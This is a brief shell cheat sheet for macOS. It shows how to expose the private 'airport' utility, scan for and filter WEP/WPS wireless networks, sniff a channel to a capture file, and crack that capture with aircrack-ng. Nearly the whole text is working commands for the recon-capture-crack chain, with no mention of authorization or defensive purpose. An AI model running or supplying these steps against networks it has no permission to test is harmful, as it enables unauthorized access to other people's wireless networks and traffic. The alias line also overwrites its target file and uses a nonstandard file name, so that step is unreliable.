# Gutem <gutemhc@gmail.com>
# OSX's Airport commands to Scan & Sniff Wireless Networks

# Create a Alias. Don't forgrt to source your .bashrc after this
echo 'alias airport="/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"' > .bash_alias

# Or you can create a symbolic link
sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/sbin/airport

# Scanning the networks
# INTERFACE is optional if you only have one wireless interface
# You can use '| grep WEP' to show only WEP Networks or '| grep WPS' to show only WPS-enabled Networks
airport (INTERFACE) scan

# Sniffing at Channel
airport (INTERFACE) sniff CHANNEL

# File generated
/tmp/airportSniffXXXXXX.cap

# Checking file's size
du -hs /tmp/*.cap

# Cracking with Aircrack. 
# Attack mode: 1/WEP, 2/WPA-PSK
aircrack-ng -a 1 -b $BSSID $CAP_FILE
